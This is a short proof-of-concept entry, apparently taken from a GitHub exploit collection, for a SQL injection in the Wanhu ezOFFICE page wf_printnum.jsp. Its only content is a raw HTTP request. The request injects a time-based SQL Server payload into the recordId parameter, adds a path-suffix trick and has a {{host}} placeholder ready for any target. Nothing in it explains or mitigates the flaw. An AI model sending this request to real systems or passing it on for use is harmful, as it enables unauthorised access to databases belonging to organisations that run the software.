# wanhu_wf_printnum.jsp_sqli

from: https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7ezOFFICE-wf_printnum.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.4.8 @2

```
GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
